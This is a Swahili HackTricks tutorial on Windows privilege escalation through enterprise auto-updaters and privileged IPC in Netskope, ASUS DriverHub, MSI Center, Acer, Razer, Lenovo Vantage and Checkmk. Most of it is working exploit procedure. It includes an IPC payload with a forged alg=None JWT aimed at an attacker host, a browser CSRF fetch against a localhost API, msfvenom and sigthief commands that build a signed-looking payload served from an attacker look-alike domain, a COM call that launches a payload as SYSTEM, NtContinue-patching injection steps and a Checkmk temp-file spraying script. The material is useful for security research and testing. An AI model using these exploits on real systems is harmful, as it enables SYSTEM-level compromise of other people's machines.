# Kutumia Vibaya Enterprise Auto-Updaters na Privileged IPC (kwa mfano, Netskope, ASUS na MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unaeleza kwa ujumla aina ya minyororo ya Windows local privilege escalation inayopatikana katika enterprise endpoint agents na updaters zinazotoa IPC surface inayoweza kufikiwa kwa urahisi na mtiririko wa update wenye privileged permissions. Mfano unaowakilisha aina hii ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye privileged permissions za chini anaweza kulazimisha mchakato wa enrollment kuwasiliana na server inayodhibitiwa na mshambuliaji, kisha kuwasilisha MSI hasidi ambayo huduma ya SYSTEM husakinisha.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Mawazo muhimu unayoweza kutumia tena dhidi ya bidhaa zinazofanana:
- Tumia vibaya localhost IPC ya privileged service ili kulazimisha enrollment au reconfiguration kuelekezwa kwenye server ya mshambuliaji.
- Tekeleza update endpoints za vendor, wasilisha Trusted Root CA ya ulaghai, kisha elekeza updater kwenye package hasidi “iliyotiwa saini.”
- Epuka ukaguzi dhaifu wa signer (orodha za kuruhusu za CN), digest flags za hiari, na MSI properties zisizo na vizuizi vya kutosha.
- Ikiwa IPC “imesimbwa kwa njia fiche”, pata key/IV kutoka kwa machine identifiers zinazoweza kusomwa na kila mtu na zimehifadhiwa kwenye registry.
- Ikiwa huduma inazuia callers kwa kuangalia image path/process name, ingiza msimbo kwenye process iliyo kwenye orodha ya kuruhusiwa au anzisha process ikiwa suspended kisha anzisha DLL yako kupitia marekebisho madogo ya thread context.

Custom local TCP services zinahitaji ukaguzi huohuo wa utambulisho na mipaka ya ingizo hata zinapohitaji PIN au credential nyingine ya application. Tambua process na akaunti ya huduma inayotumika kwa listener, kisha kagua binary/version halisi iliyowekwa na kama sehemu zinazodhibitiwa na caller hukaguliwa urefu wake kabla ya kunakiliwa kwenye fixed buffers au kutumiwa kutengeneza amri ya child process. [Mwongozo wa Microsoft kuhusu buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) unaeleza kwa nini ingizo la nje lisilokaguliwa ni hatari katika native code yenye privileged permissions. Listener ya loopback, credential iliyowekwa moja kwa moja kwenye msimbo, au jina la process pekee havithibitishi uwepo wa memory corruption au utekelezaji wa SYSTEM; ufikikaji, authorization, code path, na mitigations ni masharti tofauti. Fanya uorodheshaji wa kawaida bila kutuma ingizo lenye urefu wa kusababisha crash kwenye huduma inayotumika.

---
## 1) Kulazimisha enrollment ielekezwe kwenye server ya mshambuliaji kupitia localhost IPC

Agents nyingi huja na user-mode UI process inayowasiliana na SYSTEM service kupitia localhost TCP kwa kutumia JSON.

Kilichoonekana kwenye Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Mtiririko wa exploit:
1) Tengeneza JWT enrollment token ambayo claims zake zinadhibiti backend host (kwa mfano, AddonUrl). Tumia alg=None ili sahihi isihitajike.
2) Tuma ujumbe wa IPC unaoanzisha provisioning command pamoja na JWT yako na jina la tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service huanza kuwasiliana na rogue server yako ili kupata enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Maelezo:
- Ikiwa uthibitishaji wa caller unategemea path/jina, anzisha ombi kutoka kwa vendor binary iliyo kwenye allow-list (angalia §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC ya usimamizi inayofikiwa kupitia mtandao

Mpaka huu wa uaminifu hauishii kila wakati kwenye localhost. Katika kesi iliyoripotiwa ya MyReport Updater 2.1.1, service ya `LocalSystem` ilisikiliza kwenye interfaces zote na kukubali mabadiliko ya usanidi wa gRPC bila uthibitishaji, yaliyobadilisha host ya marejeo, port na operating mode. Kwa variant ya mbali, ufikiaji wa mtandao kwa listener na ufikiaji wa kutoka kwa service kwenda kwa reference iliyochaguliwa vilihitajika. Tathmini haya kando na iwapo mtiririko wa baadaye wa package unaweza kuvuka mpaka wa uandishi wa faili.<sup>[[16]](#references)</sup>

---
## 2) Kuteka nyara update channel ili kuendesha code kama SYSTEM

Mara client inapowasiliana na server yako, tekeleza endpoints zinazotarajiwa na ielekeze kwenye MSI ya mshambuliaji. Mfuatano wa kawaida:

1) /v2/config/org/clientconfig → Rudisha usanidi wa JSON wenye muda mfupi sana wa updater, kwa mfano:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha cheti cha PEM CA. Huduma hukisakinisha kwenye hifadhi ya Local Machine Trusted Root.
3) /v2/checkupdate → Toa metadata inayoelekeza kwenye MSI hasidi na toleo bandia.

Kukwepa ukaguzi wa kawaida unaoonekana kwenye mifumo halisi:
- Orodha ya kuruhusu ya Signer CN: huduma inaweza kuangalia tu kama Subject CN ni sawa na “netSkope Inc” au “Netskope, Inc.”. CA yako feki inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- Sifa ya CERT_DIGEST: jumuisha sifa ya MSI isiyo hasidi inayoitwa CERT_DIGEST. Hakuna utekelezaji wa ukaguzi wakati wa usakinishaji.
- Utekelezaji wa hiari wa ukaguzi wa digest: bendera ya usanidi (kwa mfano, check_msi_digest=false) huzima uthibitishaji wa ziada wa kriptografia.

Matokeo: huduma ya SYSTEM husakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
na kutekeleza msimbo wowote kama NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Somo la kukwepa viraka: ikiwa muuzaji atajibu kwa kuruhusu orodha ndogo ya domain “zinazoaminika” badala ya kuthibitisha chanzo cha masasisho kwa kriptografia, tafuta redirector au reverse proxy zinazomilikiwa na muuzaji ambazo bado zinakuwezesha kuelekeza trafiki. Katika kesi ya Netskope, utafiti wa umma uliofuata ulionyesha kuwa orodha ya kuruhusu ya enzi ya R129 bado ingeweza kutumiwa vibaya kupitia `rproxy.goskope.com`, ambayo ilipitisha maudhui ya Azure App Service yaliyodhibitiwa na mshambuliaji. Chukulia orodha za hostname kama kikwazo kidogo, si kama mpaka wa uaminifu.<sup>[[14]](#references)</sup>

Aina nyingine ya hitilafu ni **metadata ya kifurushi inayolingana yenyewe lakini isiyothibitishwa**. Katika kesi ya MyReport, rejeleo lililodhibitiwa na mshambuliaji lilitoa archive iliyorekebishwa huku mpatanishi akibadilisha majibu ya MD5 digest na ukubwa ya muuzaji kabla hayajafika kwa updater. Kulinganisha thamani hizo kulikagua tu ulinganifu wa majibu, si chanzo cha muuzaji; hakukuwa na haja ya MD5 collision. Kisha, saraka ya usakinishaji iliyochaguliwa na mtumiaji ilifanya utoaji wa faili wenye ruhusa za juu kuwa mpaka wa uandishi wa faili. Primitive ya kupakia DLL iliyotokana na hili imefafanuliwa katika [kuunganisha uandishi wa faili kiholela na utekaji wa DLL](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Kutengeneza maombi ya IPC yaliyosimbwa kwa njia fiche (yanapokuwepo)

Kuanzia R127, Netskope ilifunga JSON ya IPC kwenye sehemu ya encryptData inayoonekana kama Base64. Reverse engineering ilionyesha matumizi ya AES yenye key/IV zilizotokana na thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kuiga usimbaji na kutuma amri halali zilizofichwa kwa usimbaji kutoka kwa mtumiaji wa kawaida.<sup>[[1]](#references)[[2]](#references)</sup> Dokezo la jumla: ikiwa agent itaanza ghafla “kusimba kwa njia fiche” IPC yake, tafuta device ID, product GUID, na install ID chini ya HKLM kama nyenzo.

---
## 4) Kukwepa orodha za kuruhusu wapigaji wa IPC (ukaguzi wa path/name)

Baadhi ya huduma hujaribu kuthibitisha peer kwa kutafuta PID ya muunganisho wa TCP na kulinganisha path/name ya image na binary za muuzaji zilizo kwenye orodha ya kuruhusu chini ya Program Files (kwa mfano, stagentui.exe, bwansvc.exe, epdlp.exe).

Njia mbili za vitendo za kukwepa:
- DLL injection kwenye mchakato unaoruhusiwa (kwa mfano, nsdiag.exe) na kupeleka IPC kupitia proxy iliyo ndani yake.
- Anzisha binary inayoruhusiwa ikiwa imesimamishwa na uanzishe proxy DLL yako bila CreateRemoteThread (tazama §5) ili kutimiza sheria za kuzuia uchezewaji zinazotekelezwa na driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection inayozingatia ulinzi dhidi ya uchezewaji: mchakato uliosimamishwa + kiraka cha NtContinue

Bidhaa mara nyingi husambaza driver ya minifilter/OB callbacks (kwa mfano, Stadrv) ili kuondoa ruhusa hatari kwenye handles za michakato inayolindwa:
- Mchakato: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: huzuia ruhusa kuwa THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE pekee

Loader ya user-mode inayotegemewa na inayozingatia vikwazo hivi:
1) Tumia CreateProcess kuanzisha binary ya muuzaji kwa CREATE_SUSPENDED.
2) Pata handles ambazo bado unaruhusiwa kupata: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye mchakato, na handle ya thread yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au THREAD_RESUME pekee ikiwa unarekebisha msimbo kwenye RIP inayojulikana).
3) Andika upya ntdll!NtContinue (au thunk nyingine ya mapema ambayo imehakikishwa kuwa imepakiwa) kwa stub ndogo inayopiga LoadLibraryW na kupitisha path ya DLL yako, kisha iruke kurudi.
4) Tumia ResumeThread ili kuanzisha stub yako ndani ya mchakato na kupakia DLL yako.

Kwa kuwa hukutumia PROCESS_CREATE_THREAD au PROCESS_SUSPEND_RESUME kwenye mchakato ambao tayari umelindwa (uliuunda wewe), sera ya driver inatimizwa.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Zana za vitendo
- NachoVPN (plugin ya Netskope) huendesha kiotomatiki rogue CA, kusaini MSI hasidi, na kutoa endpoint zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope ni mteja maalum wa IPC anayetengeneza ujumbe wa IPC kiholela (unaoweza kusimbwa kwa AES kwa hiari) na unaojumuisha injection ya mchakato uliosimamishwa ili kutuma ujumbe kutoka kwa binary iliyo kwenye orodha ya kuruhusu.<sup>[[4]](#references)</sup>

## 7) Mtiririko wa haraka wa triage kwa updater/IPC isiyojulikana

Unapochunguza agent mpya ya endpoint au kifurushi cha “helper” cha motherboard, mtiririko wa haraka kwa kawaida hutosha kubaini kama unachunguza shabaha yenye matumaini ya privesc:<sup>[[6]](#references)</sup>

1) Orodhesha wasikilizaji wa loopback na uwahusishe na michakato ya muuzaji:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Orodhesha named pipes zinazoweza kutumika:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Chimba data ya uelekezaji iliyohifadhiwa kwenye registry inayotumiwa na seva za IPC zinazotumia plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Kwanza, toa majina ya endpoint, funguo za JSON, na vitambulisho vya command kutoka kwa client ya user-mode. Frontend zilizopakiwa za Electron/.NET mara nyingi leak schema nzima:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Tafuta sharti halisi linaloamua uaminifu, si njia ya msimbo tu inayoishia kuzindua mchakato:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Mifumo inayofaa kuipa kipaumbele:
- `CryptQueryObject`/uchanganuzi wa certificate bila `WinVerifyTrust` kwa kawaida humaanisha kuwa “certificate ipo” ilichukuliwa kuwa “certificate inaaminika”, na hivyo kuwezesha kunakili certificate au mbinu nyingine za kutumia fake-signer.
- Ukaguzi wa substring/suffix kwenye `Origin`, `Referer`, URL za upakuaji, majina ya process, au CN za signer si uthibitishaji. `contains(".vendor.com")` kwa kawaida inaweza kutumiwa vibaya kwa kutumia domains bandia zinazofanana zinazodhibitiwa na mshambuliaji.
- Ikiwa GUI yenye ruhusa ndogo ndiyo huamua “file inaaminika” na broker ya SYSTEM hutumia tu matokeo hayo, kurekebisha au kutekeleza upya DLL/JS ya upande wa client mara nyingi hupita kabisa mpaka wa usalama (mgawanyo wa uthibitishaji wa mtindo wa Razer).
- Ikiwa broker inakili payload hadi `%TEMP%`/`C:\Windows\Temp` kisha kuithibitisha au kuipangia utekelezaji kutoka hapo, jaribu mara moja muda wa TOCTOU wa kubadilisha faili na modules za plugin jirani zinazotoa wrappers mbadala za `ExecuteTask()` zenye ukaguzi dhaifu.<sup>[[6]](#references)</sup>

Kwa targets zinazotumia sana named pipes, PipeViewer ni njia ya haraka ya kutambua DACL dhaifu na pipes zinazoweza kufikiwa kwa mbali kabla hujaanza kureverse protocol kwa undani.<sup>[[11]](#references)</sup>

Ikiwa target inathibitisha wapigaji kwa PID, image path, au jina la process pekee, ichukulie kama kikwazo kidogo badala ya mpaka wa usalama: kuingiza code kwenye client halali, au kuanzisha muunganisho kutoka kwa process iliyo kwenye allow-list, mara nyingi hutosha kutimiza ukaguzi wa server. Kwa named pipes hasa, [ukurasa huu kuhusu client impersonation na matumizi mabaya ya pipe](named-pipe-client-impersonation.md) unaeleza primitive hii kwa undani zaidi.

Kwa **broker ya cleanup au restore yenye ruhusa za juu**, kagua mpaka wa uaminifu wa path pamoja na ACL ya pipe. Mpigaji mwenye ruhusa za chini anaweza kuchagua restore destination au kubadilisha jina la backup artifact iliyoandaliwa katika shared directory hata wakati executable ya service na install directory yake zinalindwa. Thibitisha kando kwamba mpigaji anaweza kufikia amri ya restore, kurekebisha input au filename mahsusi iliyoandaliwa, kwamba broker inaendeshwa chini ya identity yenye ruhusa za juu, na kwamba restore operation yake kweli inaandika kwenye path iliyochaguliwa na kulindwa. Staging directory inayoweza kuandikwa au pipe inayoweza kusomwa pekee haithibitishi uwezekano wa arbitrary privileged write; mapping ya destination na tabia ya service vinahitaji code review au majaribio yanayodhibitiwa. Usitumie amri ya cleanup usiyoijua wakati wa passive enumeration kwa sababu inaweza kufuta files za mtumiaji.

---
## 8) Modular add-in brokers zilizothibitishwa kwa saini za vendor pekee (muundo wa Lenovo Vantage)

Tofauti mpya inayofaa kutafutwa ni **signed-client RPC broker**: process ya desktop ya Lenovo yenye saini na ruhusa ndogo huwasiliana na service ya SYSTEM, na service huelekeza amri za JSON kwenye seti ya add-ins zilizoelezwa kwa XML chini ya `%ProgramData%`. Mara tu execution ya code inapopatikana **ndani ya client yoyote inayokubaliwa yenye saini**, kila contract ya `runas="system"` inakuwa sehemu ya attack surface yako.<sup>[[15]](#references)</sup>

Primitives zenye thamani kubwa zilizoonekana kwenye utafiti wa Lenovo Vantage:
- **Kumwamini mpigaji kwa sababu ana saini ya vendor**: watafiti walifikia context iliyothibitishwa kwa kunakili EXE yenye saini ya Lenovo hadi kwenye directory inayoweza kuandikwa na kufanikisha DLL side-load (`profapi.dll`) ili code holela iendeshwe ndani ya client ambayo service tayari ilikuwa inaiamini.
- **Ugunduzi wa attack surface unaoendeshwa na manifest**: add-ins hutangazwa chini ya `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; contracts kadhaa huendeshwa kama `SYSTEM`, kwa hiyo kuorodhesha manifests hizo mara nyingi hufichua verbs halisi zenye ruhusa za juu kwa haraka zaidi kuliko kureverse broker yenyewe.
- **Bugs za kila amri ndani ya channel iliyothibitishwa**: baada ya kuingia ndani ya client inayoaminika, utafiti wa umma uligundua path-traversal pamoja na race conditions katika verbs za update/install, matumizi mabaya ya raw-SQL katika databases za mipangilio zenye ruhusa za juu, na ukaguzi wa registry path unaotegemea substring uliowezesha maandishi nje ya hive iliyokusudiwa.

Recon muhimu kwenye target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Hitimisho la kiutendaji: kila suite ya helper inapofichua broker ambayo kwanza huthibitisha **caller process** na kisha tu kusambaza maombi kwa amri nyingi za plugin/add-in, usiishie baada ya kupita ukaguzi wa uaminifu wa awali. Dump jedwali la manifest/contract na ufanye fuzzing kwa kila verb yenye privilege ya juu kivyake; kwa kawaida, channel iliyothibitishwa huficha hitilafu kadhaa za hatua ya pili.

---
## 1) CSRF kutoka browser kwenda localhost dhidi ya privileged HTTP APIs (ASUS DriverHub)

DriverHub husambaza huduma ya HTTP ya user-mode (ADU.exe) kwenye 127.0.0.1:53000 inayotarajia simu za browser zinazotoka https://driverhub.asus.com. Kichujio cha origin hufanya tu `string_contains(".asus.com")` kwenye kichwa cha Origin na kwenye URL za download zinazofichuliwa na `/asus/v1.0/*`. Kwa hiyo, host yoyote inayodhibitiwa na mshambuliaji kama `https://driverhub.asus.com.attacker.tld` hupita ukaguzi na inaweza kutuma maombi yanayobadilisha hali kupitia JavaScript.<sup>[[6]](#references)</sup> Tazama [misingi ya CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) kwa mifumo mingine ya kupita ukaguzi.

Mtiririko wa kiutendaji:
1) Sajili domain inayojumuisha `.asus.com` na uweke ukurasa hasidi wa wavuti hapo.
2) Tumia `fetch` au XHR kuita endpoint yenye privilege ya juu (k.m., `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma body ya JSON inayotarajiwa na handler – JS iliyopakiwa ya frontend inaonyesha schema hapa chini.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Hata CLI ya PowerShell iliyoonyeshwa hapa chini hufaulu wakati header ya Origin inapo-spoofiwa ili ionekane kuwa na thamani inayoaminika:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Ziara yoyote ya kivinjari kwenye tovuti ya mshambuliaji kwa hiyo huwa CSRF ya ndani inayohitaji mbofyo mmoja (au mibofyo sifuri kupitia `onload`) na kuendesha helper ya SYSTEM.

---
## 2) Uthibitishaji usio salama wa code-signing na kunakili cheti (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` hupakua executables zozote zilizobainishwa kwenye mwili wa JSON na kuzihifadhi kwenye `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Uthibitishaji wa URL ya upakuaji hutumia tena mantiki ileile ya substring, kwa hiyo `http://updates.asus.com.attacker.tld:8000/payload.exe` hukubaliwa. Baada ya kupakua, ADU.exe hukagua tu kama PE ina signature na kama mfuatano wa Subject unalingana na ASUS kabla ya kuiendesha — hakuna `WinVerifyTrust`, wala uthibitishaji wa chain.

Ili kutumia mtiririko huu kama silaha:
1) Unda payload (kwa mfano, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Nakili signer wa ASUS ndani yake (kwa mfano, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Weka `pwn.exe` kwenye domain inayofanana na `.asus.com` na uanzishe UpdateApp kupitia CSRF ya kivinjari iliyoelezwa hapo juu.

Kwa kuwa vichujio vya Origin na URL hutegemea substring na ukaguzi wa signer hulinganisha tu mifuatano, DriverHub hupakua na kutekeleza binary ya mshambuliaji katika muktadha wake wenye mapendeleo yaliyoinuliwa.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU ndani ya njia za kunakili/kutekeleza za updater (MSI Center CMD_AutoUpdateSDK)

Huduma ya SYSTEM ya MSI Center hufichua itifaki ya TCP ambapo kila frame ni `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Component kuu (Component ID `0f 27 00 00`) huja na `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Handler yake:
1) Hunakili executable iliyotolewa kwenda `C:\Windows\Temp\MSI Center SDK.exe`.
2) Huthibitisha signature kupitia `CS_CommonAPI.EX_CA::Verify` (subject ya cheti lazima iwe “MICRO-STAR INTERNATIONAL CO., LTD.” na `WinVerifyTrust` ifaulu).
3) Huunda scheduled task inayoendesha faili ya muda kama SYSTEM kwa kutumia arguments zinazodhibitiwa na mshambuliaji.

Faili iliyonakiliwa haifungwi kati ya uthibitishaji na `ExecuteTask()`. Mshambuliaji anaweza:
- Kutuma Frame A inayoelekeza kwenye binary halali iliyotiwa saini na MSI (inahakikisha ukaguzi wa signature unafaulu na task inawekwa kwenye foleni).
- Kuitumia pamoja na ujumbe unaojirudia wa Frame B unaoelekeza kwenye payload hasidi, na kubadilisha `MSI Center SDK.exe` mara tu baada ya uthibitishaji kukamilika.

Scheduler inapowasha task, hutekeleza payload iliyobadilishwa chini ya SYSTEM licha ya kuwa faili asilia ndiyo iliyothibitishwa. Exploitation ya kuaminika hutumia goroutines/threads mbili kutuma CMD_AutoUpdateSDK mara nyingi hadi dirisha la TOCTOU lishindwe.<sup>[[6]](#references)</sup>

---
## 2) Kutumia vibaya IPC maalum ya kiwango cha SYSTEM na impersonation (MSI Center + Acer Control Centre)

### Seti za amri za MSI Center TCP
- Kila plugin/DLL inayopakiwa na `MSI.CentralServer.exe` hupokea Component ID iliyohifadhiwa chini ya `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Baiti 4 za kwanza za frame huchagua component hiyo, na hivyo kuwawezesha washambuliaji kuelekeza amri kwenye modules zozote.
- Plugins zinaweza kufafanua task runners zao. `Support\API_Support.dll` hufichua `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` na huita moja kwa moja `API_Support.EX_Task::ExecuteTask()` bila **uthibitishaji wa signature** — mtumiaji yeyote wa ndani anaweza kuielekeza kwenye `C:\Users\<user>\Desktop\payload.exe` na kupata utekelezaji wa SYSTEM kwa uhakika.
- Kunasa trafiki ya loopback kwa Wireshark au kuchunguza binaries za .NET katika dnSpy hufichua haraka ulinganifu wa Component ↔ command; kisha clients maalum za Go/Python zinaweza kutuma tena frames.<sup>[[6]](#references)</sup>

### Named pipes za Acer Control Centre na viwango vya impersonation
- `ACCSvc.exe` (SYSTEM) hufichua `\\.\pipe\treadstone_service_LightMode`, na ACL yake ya hiari huruhusu clients za mbali (kwa mfano, `\\TARGET\pipe\treadstone_service_LightMode`). Kutuma command ID `7` pamoja na njia ya faili huita utaratibu wa huduma wa kuanzisha process.
- Maktaba ya client husimba byte ya mwisho maalum (113) pamoja na args. Uchunguzi wa nguvu kwa Frida/`TsDotNetLib` (angalia [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) kwa vidokezo vya instrumentation) unaonyesha kuwa handler asilia hubadilisha thamani hii kuwa `SECURITY_IMPERSONATION_LEVEL` na integrity SID kabla ya kuita `CreateProcessAsUser`.
- Kubadilisha 113 (`0x71`) na 114 (`0x72`) hupeleka utekelezaji kwenye tawi la jumla linalohifadhi tokeni kamili ya SYSTEM na kuweka high-integrity SID (`S-1-16-12288`). Kwa hiyo binary iliyoanzishwa huendeshwa kama SYSTEM bila vizuizi, ndani ya mashine na kati ya mashine.
- Changanya hilo na flag ya installer iliyofichuliwa (`Setup.exe -nocheck`) ili kusakinisha ACC hata kwenye lab VMs na kujaribu pipe bila vifaa vya vendor.<sup>[[6]](#references)</sup>

Hitilafu hizi za IPC zinaonyesha kwa nini huduma za localhost lazima zilazimishe uthibitishaji wa pande zote (ALPC SIDs, vichujio vya `ImpersonationLevel=Impersonation`, uchujaji wa tokeni), na kwa nini helper ya kila module ya “run arbitrary binary” lazima itumie uthibitishaji uleule wa signer.

---
## 3) Helpers za COM/IPC za “elevator” zinazotegemea uthibitishaji dhaifu wa user-mode (Razer Synapse 4)

Razer Synapse 4 iliongeza muundo mwingine muhimu katika kundi hili: mtumiaji mwenye mapendeleo madogo anaweza kuiomba COM helper ianzishe process kupitia `RzUtility.Elevator`, huku uamuzi wa kuamini ukikabidhiwa kwa DLL ya user-mode (`simple_service.dll`) badala ya kutekelezwa kwa uthabiti ndani ya mpaka wenye mapendeleo.

Njia ya exploitation iliyozingatiwa:
- Unda COM object `RzUtility.Elevator`.
- Ita `LaunchProcessNoWait(<path>, "", 1)` ili kuomba uzinduzi wenye mapendeleo yaliyoinuliwa.
- Katika public PoC, ukaguzi wa PE-signature ndani ya `simple_service.dll` huondolewa kwa patch kabla ya kutuma ombi, na hivyo kuruhusu executable yoyote iliyochaguliwa na mshambuliaji kuzinduliwa.<sup>[[6]](#references)[[10]](#references)</sup>

Ombi dogo la PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Hitimisho la jumla: unapochunguza upya suites za “helper”, usiishie kwenye TCP ya localhost au named pipes. Angalia COM classes zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha ikiwa service yenye privileges kweli inathibitisha yenyewe binary lengwa au inaamini tu matokeo yaliyokokotolewa na client DLL ya user-mode inayoweza kufanyiwa patch. Muundo huu unatumika zaidi ya Razer: muundo wowote uliogawanywa ambapo broker yenye privileges nyingi hutumia uamuzi wa ruhusu/kataa kutoka upande wenye privileges chache ni eneo linaloweza kuwa na privesc.


---
## Utekelezaji wa script ya temp inayotabirika wakati wa MSI repair (Checkmk Agent / CVE-2024-0670)

Baadhi ya Windows agents bado hutekeleza vitendo vyenye privileges kwa kuandika `.cmd` ya muda kwenye `C:\Windows\Temp` na kuiendesha kama `SYSTEM`. Ikiwa jina la faili linatabirika na service haiundi upya faili zilizopo kwa usalama, mtumiaji mwenye privileges chache anaweza kuunda mapema faili ya temp inayotarajiwa na kuiweka **read-only**, kisha kufanya mchakato wenye privileges nyingi utekeleze maudhui yanayodhibitiwa na mshambuliaji badala ya script yake yenyewe.

Imeonekana katika builds zilizo hatarini za Checkmk Agent:
- muundo wa temp: `cmk_all_<PID>_1.cmd`
- matawi yaliyoathirika: `2.0.0`, `2.1.0`, `2.2.0`
- kichochezi: **repair** ya kifurushi cha agent kilichohifadhiwa cha MSI<sup>[[8]](#references)[[9]](#references)</sup>

Mtiririko wa kazi kwa vitendo:
1. Kadiria masafa halisi ya PID kutokana na process IDs za sasa au PID ya agent inayoendesha.
2. Andika payload fupi ya `.cmd` ya **ASCII** (`Set-Content -Encoding Ascii` au uelekeze matokeo kupitia `cmd.exe`; epuka matokeo ya PowerShell ya UTF-16 kwa batch files).
3. Sambaza `C:\Windows\Temp\cmk_all_<PID>_1.cmd` katika masafa ya wagombea, kisha weka kila faili kuwa read-only.
4. Anzisha repair ya MSI iliyohifadhiwa ili service yenye privileges ijaribu kuunda upya, kisha itekeleze script ya temp.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ikiwa bidhaa iliyo hatarini imesakinishwa kwa kutumia Windows Installer, tambua jina lake kutoka kwa MSI iliyo katika `C:\Windows\Installer` na inayoonekana kuwa na jina nasibu kabla ya kuanzisha ukarabati:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Maelezo ya uendeshaji:
- `qwinsta` husaidia wakati `msiexec /fa` inashindwa kutoka kwenye WinRM shell isiyo ya mwingiliano na unahitaji kubaini kama session iliyopo ya desktop au session iliyokatika inaweza kuanzisha repair ipasavyo.<sup>[[7]](#references)</sup>
